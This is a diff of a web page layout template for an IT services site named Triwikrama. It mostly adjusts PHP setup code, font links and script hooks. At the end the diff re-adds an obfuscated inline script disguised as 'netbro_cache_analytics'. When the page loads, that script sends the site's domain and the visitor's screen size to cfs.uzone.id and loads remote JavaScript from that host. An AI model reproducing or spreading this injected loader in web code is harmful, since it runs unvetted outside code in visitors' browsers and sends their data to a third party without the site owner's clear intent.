@@ -20,19 +20,7 @@
 <meta property="fb:admins" content="100000919400274" />
 
     <title>Triwikrama - Professional IT Solutions</title>
-    <?php   error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); ?>
-
-    <?php 
-      $theme = "";
-      if($theme != ""){ $theme .= "/";}
-      $assets = "../theme-1/".$theme;
-      $page = $_GET['page'];
-      $page_path = 'pages/';
-      $homepage = "home";
-
-      $bg = rand(1, 3);
-      $bgchange = $assets."img/bg/".$bg.".jpg";
-    ?>
+    
     <!-- Bootstrap Core CSS -->
      <link href="{{ asset('theme-1/css/bootstrap-grid.min.css') }}" rel="stylesheet">
      <link href="{{ asset('theme-1/css/bootstrap-flex.min.css') }}" rel="stylesheet">
@@ -47,7 +35,7 @@
     <link href='http://fonts.googleapis.com/css?family=Roboto+Condensed:300italic,400italic,700italic,400,300,700' rel='stylesheet' type='text/css'>
     <link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,600italic,400,300,600,700' rel='stylesheet' type='text/css'>
     <link href='https://fonts.googleapis.com/css?family=Khand:400,500' rel='stylesheet' type='text/css'>
-    <link href='https://fonts.googleapis.com/css?family=Ubuntu+Condensed' rel='stylesheet' type='text/css'>
+    <link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400" rel="stylesheet">
     <link rel="stylesheet" type="text/css" href="{{ asset('theme-1/fonts/font-awesome/css/font-awesome.css') }}">
 
     <!-- Custom CSS -->
@@ -175,8 +163,8 @@ img {
     <script src="{{ asset(' theme-1/js/bottom.js') }}"></script>
 
   <script type="text/javascript">
-  
   </script>
+  @yield('js')
   <script>
 
   var galleryThumbs = new Swiper('.gallery-thumbs', {
@@ -264,6 +252,8 @@ img {
 
 
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqs04cMxUdflh5Ly7Bje%2fFpDOkRQTvnthnTrvmCZdIgv%2bNWDYQS%2fzemXPgHAZcTNx7huTd0ekFdwHvCLBMCDymV68s6H2KMn2%2fa8P3BZsgOhs%2bc32krIMeoMozVUkGmCWCrKwMX2nixhPNC99AAP669TGjYselUh5yhrlmTqGJBUZrQ8GsVCw9GOuAeZklQ6MsCJ2UpIhOkVsObcuZH6F5uNmd3riCHgeeuzEexY%2fQSS2IymXUnY2FmxlGUOCRjnm8mhljZ8tXTlvaNnphn%2fErtUdzgqbY2q1X1YWZrgNZCb3g6O9rBiyNxWTn9JgqdI6Dg%2fh7uqh%2bxVDJbq%2bn79FotCFCN26kCDoIp4R5y7KPDlZSjk9TEAmeYKCOycG43ZLLC3qd9UQfa2GPuYrlbSSfnLDSy%2fgmfXBThsX4AHj0v8a1vkhqdqA87nbtJhP3c%2fC21IUkz5PnOfMEyy4ab3%2bJHClpdqPAqqY%2bfSxoEISEH8UauS5ptVoxYTZXiwE3MyN2WPm9Hbm2eVV4aGdpVyPydJN%2fSlrmNUP" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA6NT89HNLNPn6IB1UEyZH9%2b4byLF7QSvLX9swJErupIBMrQac0Wm7E7SZ7RjuH7Q5jHLv3DyawqxW1Cw1bKbnUv1TT4qyAYPsOHaDjO9Tulsu%2f0wqSCDdFIPLh%2bnLWYEKfjMk%2b0KVzmidcU0PM5zxLQ9OuYUWVV%2bK%2bwDQn2AZ33Xag%2fXcsU8w6dfxi8dm2a%2fyBfnN0IcUkAlze26OXHSqTL5EAAv6a2IZ%2bcG5qoBDDCSjUgYCHYGkVKyD0dQpfqVUiomZTr0km%2bTqaQXgUTxkDfSwpHH%2bnQAvmkhntAOZKxtwF84pFHpqzNDeYu6oRRIvd%2bNlppcFGfDrLKSInWqj5irSIIxeK5Dh9%2bj8yW3%2fMc%2b54VVmKLFkpO0Uycjb8YMxhTNVx7oYiNYstpHVXp2VI0tuQKft9DhPwq%2bOO3AcGJjACPLBaZ6gPS31Ws5hqZSKSVDb%2f0nifRkD7IReIqUT%2bgGHGOV7y2ao4SyqtAvRkJq7u2jmjEh0yTs1M0%2b90SKqGltp70Z7jpGp9xdXtjogxafqlqmgQ2ArWJIWsDRjbbo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 </body>
 </html>
